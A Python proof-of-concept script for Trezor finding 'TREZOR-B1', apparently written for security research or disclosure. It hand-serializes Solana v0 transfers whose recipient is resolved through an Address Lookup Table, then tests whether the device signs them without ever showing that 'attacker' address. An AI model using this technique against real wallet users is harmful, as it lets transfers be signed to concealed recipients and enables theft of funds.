"""PoC for TREZOR-B1 — Solana v0 transfer whose recipient is an Address
Lookup Table (ALT) reference is confirmed without ever showing the actual
recipient address (trezor-firmware
`core/src/apps/solana/transaction/__init__.py:376-384`,
`core/src/apps/solana/layout.py:50-58,320-360`).

Method:
* CONTROL: v0 message with a System Program Transfer whose recipient is a
  STATIC account. Expect the recipient address on screen.
* B1: the same transfer, but the recipient is loaded from an ALT
  (lookup-table address + index 0 in the writable section -> global account
  index 2). The "recipient" address the table resolves to is chosen by us
  (the attacker address). Expect: that address NEVER appears on any screen;
  only the table address + index are shown; the signature is still produced.

The v0 message is serialized by hand (Solana short-vec / compact-u16
encoding); the layout matches trezor-firmware's own
`tests/device_tests/solana/construct/transaction.py` Message struct.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from trezorlib import solana
from trezorlib.tools import parse_path

from common import fw_info, open_session, run_signing, save_json
from solana_serialize import b58encode, serialize_v0, system_transfer_data

SYSTEM_PROGRAM = "11111111111111111111111111111111"
LAMPORTS = 1_000_000
# Any plausible blockhash (32 bytes, base58) — the device is offline and
# never validates it. Taken from trezor-firmware's Solana fixtures.
BLOCKHASH = "2p4rYZAaFfV5Uk5ugdG5KPNty9Uda9B3b4gWB8qnNqak"
SOLANA_PATH = parse_path("m/44h/501h/0h/0h")


def build_tx(funding: str, recipient: str, use_alt: bool, table: str) -> bytes:
    if use_alt:
        # Static accounts: [funding (signer), system program].
        # The recipient is ALT index 0 (writable) -> global index 2.
        accounts = [funding, SYSTEM_PROGRAM]
        luts = [{"table": table, "writable": [0], "readonly": []}]
        recipient_index = 2
    else:
        accounts = [funding, recipient, SYSTEM_PROGRAM]
        luts = []
        recipient_index = 1
    instructions = [
        {
            "program_id": 1 if use_alt else 2,
            "accounts": [0, recipient_index],
            "data": system_transfer_data(LAMPORTS),
        }
    ]
    header = (1, 0, 1)  # 1 signer, 0 readonly signers, 1 readonly non-signer
    return serialize_v0(header, accounts, BLOCKHASH, instructions, luts)


def analyse(outcome: dict, recipient: str, table: str) -> dict:
    pages_text = "\n".join(outcome["pages"])
    compact = "".join(pages_text.split())
    return {
        "signed": outcome.get("signed", False),
        "error": outcome.get("error"),
        "signature": outcome.get("signature"),
        "recipient_shown": recipient in pages_text,
        "table_shown": table in pages_text,
        "mentions_lookup_table": "lookup table" in pages_text.lower(),
        "n_pages": len(outcome["pages"]),
        "pages": outcome["pages"],
    }


def main(out_path: str = "poc-results/b1.json", trezor_path: str | None = None) -> dict:
    test_ctx, session = open_session(trezor_path)
    result: dict = {"finding": "TREZOR-B1", "fw": fw_info(session)}

    # The funding account must be the device's own address (the signer).
    funding = solana.get_address(session, SOLANA_PATH)
    # "Attacker" recipient: an address the ALT is declared to resolve to.
    attacker = b58encode(bytes([0x22] * 32))
    # The lookup table itself: any valid address.
    table = b58encode(bytes(range(1, 33)))
    result["funding_address"] = funding
    result["attacker_recipient"] = attacker
    result["lookup_table"] = table

    def _sign(serialized: bytes):
        def _fn(session):
            return solana.sign_tx(
                session,
                address_n=SOLANA_PATH,
                serialized_tx=serialized,
                additional_info=None,
            )

        return _fn

    # CONTROL — static recipient.
    tx = build_tx(funding, attacker, use_alt=False, table=table)
    outcome = run_signing(test_ctx, session, _sign(tx))
    result["control"] = analyse(outcome, attacker, table)

    # B1 — recipient via ALT.
    tx = build_tx(funding, attacker, use_alt=True, table=table)
    outcome = run_signing(test_ctx, session, _sign(tx))
    result["b1_alt_recipient"] = analyse(outcome, attacker, table)

    control_ok = bool(
        result["control"]["signed"] and result["control"]["recipient_shown"]
    )
    result["control_ok"] = control_ok
    t = result["b1_alt_recipient"]
    t["recipient_hidden"] = bool(
        control_ok
        and t["signed"]
        and not t["recipient_shown"]
        and t["table_shown"]
        and t["mentions_lookup_table"]
    )
    result["verdict"] = (
        "CONFIRMED"
        if control_ok and t["recipient_hidden"]
        else ("INCONCLUSIVE" if not control_ok else "NOT_REPRODUCED")
    )
    save_json(result, out_path)
    print(f"B1 verdict: {result['verdict']} (control_ok={control_ok})")
    return result


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--out", default="poc-results/b1.json")
    parser.add_argument("--trezor-path", default=None)
    args = parser.parse_args()
    main(args.out, args.trezor_path)
